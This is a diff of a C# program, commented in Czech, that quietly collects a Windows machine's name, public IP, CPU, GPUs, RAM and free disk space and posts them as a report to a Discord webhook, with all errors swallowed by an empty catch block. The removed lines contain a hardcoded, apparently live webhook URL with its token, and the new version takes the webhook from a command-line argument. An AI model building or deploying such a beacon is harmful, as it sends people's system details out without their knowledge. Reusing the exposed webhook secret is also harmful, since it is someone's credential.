@@ -1,40 +1,52 @@
 using System;
-using System.Diagnostics;
-using System.Net;
 using System.Net.Http;
 using System.Text;
 using System.Management;
+using System.Collections.Generic;
+using System.Linq;
 
 public class Program
 {
-    public static void Main()
+    public static void Main(string[] args)
     {
         try {
-            string pcName = Environment.MachineName;
-            string ip = new WebClient().DownloadString("https://ifconfig.me/ip").Trim();
+            string webhook = args[0];
+            var client = new HttpClient();
+
+            // 1. Získání IP (moderně přes HttpClient)
+            string ip = client.GetStringAsync("https://ifconfig.me/ip").GetAwaiter().GetResult().Trim();
             
+            // 2. HW Info
+            string pcName = Environment.MachineName;
+            
+            // CPU
             string cpu = "";
-            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Name from Win32_Processor"))
-                foreach (ManagementObject obj in searcher.Get()) cpu = obj["Name"].ToString();
+            using (var s = new ManagementObjectSearcher("select Name from Win32_Processor"))
+                foreach (var obj in s.Get()) cpu = obj["Name"].ToString();
 
-            string gpu = "";
-            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Name from Win32_VideoController"))
-                foreach (ManagementObject obj in searcher.Get()) gpu = obj["Name"].ToString();
+            // GPU (opraveno pro více grafik)
+            var gpus = new List<string>();
+            using (var s = new ManagementObjectSearcher("select Name from Win32_VideoController"))
+                foreach (var obj in s.Get()) gpus.Add(obj["Name"].ToString());
+            string gpuList = string.Join(", ", gpus);
 
-            long memBytes = 0;
-            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Capacity from Win32_PhysicalMemory"))
-                foreach (ManagementObject obj in searcher.Get()) memBytes += Convert.ToInt64(obj["Capacity"]);
-            int ram = (int)(memBytes / 1024 / 1024 / 1024);
+            // RAM
+            long mem = 0;
+            using (var s = new ManagementObjectSearcher("select Capacity from Win32_PhysicalMemory"))
+                foreach (var obj in s.Get()) mem += Convert.ToInt64(obj["Capacity"]);
+            int ram = (int)(mem / 1024 / 1024 / 1024);
 
+            // Disk
             var drive = new System.IO.DriveInfo("C");
             long disk = drive.AvailableFreeSpace / 1024 / 1024 / 1024;
 
-            string report = $"**REPORT: {pcName}**\n---\n**IP:** {ip}\n**CPU:** {cpu}\n**GPU:** {gpu}\n**RAM:** {ram}GB\n**Disk C:** {disk}GB volných";
-            string json = "{\"content\":\"" + report.Replace("\n", "\\n") + "\"}";
+            // 3. Report & JSON
+            string report = $"**REPORT: {pcName}**\\n---\\n**IP:** {ip}\\n**CPU:** {cpu}\\n**GPU:** {gpuList}\\n**RAM:** {ram}GB\\n**Disk C:** {disk}GB volných";
+            string json = "{\"content\":\"" + report + "\"}";
 
-            var client = new HttpClient();
+            // 4. Odeslání
             var content = new StringContent(json, Encoding.UTF8, "application/json");
-            client.PostAsync("https://discord.com/api/webhooks/1491696622810431578/I97AkgZpg3XcrGB5OAv1Ix57u7eawgP_ahGArkslznA8Txb-atkbQvUTruf9ZFbpMpV1", content).Wait();
+            client.PostAsync(webhook, content).GetAwaiter().GetResult();
         }
         catch { }
     }
